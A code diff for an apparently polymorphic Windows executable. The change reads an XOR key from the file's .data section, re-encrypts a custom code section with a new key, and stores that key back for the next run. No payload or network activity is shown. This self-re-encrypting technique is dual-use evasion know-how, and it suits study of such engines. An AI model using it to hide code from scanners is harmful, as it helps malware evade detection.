@@ -176,6 +176,15 @@ void mutate_executable(char* exe_path) {
         die("Could not map view of file");
     }
 
+    // Find .data section (where our key variable is stored)
+    IMAGE_SECTION_HEADER* data_section = find_section(mapped_data, ".data");
+    if (data_section == NULL) {
+        UnmapViewOfFile(mapped_data);
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
+        die("Could not find .data section");
+    }
+
     // Find custom section
     IMAGE_SECTION_HEADER* poly_section = find_section(mapped_data, CUSTOM_SECTION);
     if (poly_section == NULL) {
@@ -187,6 +196,18 @@ void mutate_executable(char* exe_path) {
 
     printf("Found section '%s' at offset 0x%x, size 0x%x\n",
            CUSTOM_SECTION, poly_section->PointerToRawData, poly_section->SizeOfRawData);
+
+    // Get pointer to key in file's .data section
+    unsigned char* key_in_file = (unsigned char*)mapped_data + data_section->PointerToRawData;
+
+    // Copy current key from file to memory (for decryption)
+    memcpy(key, key_in_file, KEY_SIZE);
+
+    printf("Current key from file: ");
+    for (int i = 0; i < KEY_SIZE; i++) {
+        printf("%02x ", key[i]);
+    }
+    printf("\n");
 
     // Get pointer to section data in file
     unsigned char* section_data = (unsigned char*)mapped_data + poly_section->PointerToRawData;
@@ -201,6 +222,9 @@ void mutate_executable(char* exe_path) {
         printf("%02x ", key[i]);
     }
     printf("\n");
+
+    // Update key in the file's .data section so next execution can decrypt
+    memcpy(key_in_file, key, KEY_SIZE);
 
     // Re-encrypt with new key
     xor_crypt(section_data, poly_section->SizeOfRawData);
